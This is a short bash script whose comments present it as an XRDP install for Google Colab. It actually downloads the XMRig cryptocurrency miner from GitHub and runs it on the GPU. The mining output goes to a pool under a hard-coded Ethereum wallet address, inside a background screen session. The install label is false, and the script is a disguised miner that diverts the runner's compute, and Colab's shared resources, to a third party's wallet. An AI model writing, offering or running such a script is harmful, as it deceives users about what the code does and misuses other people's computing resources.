#! /bin/bash
# Install XRDP
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig --cuda -k -o ethash.unmineable.com:3333 -u ETH:0x8137a32D7c03E90CBbe07A74b9cbc148d1Dc33b5.W1#50ib-bxxq -p x
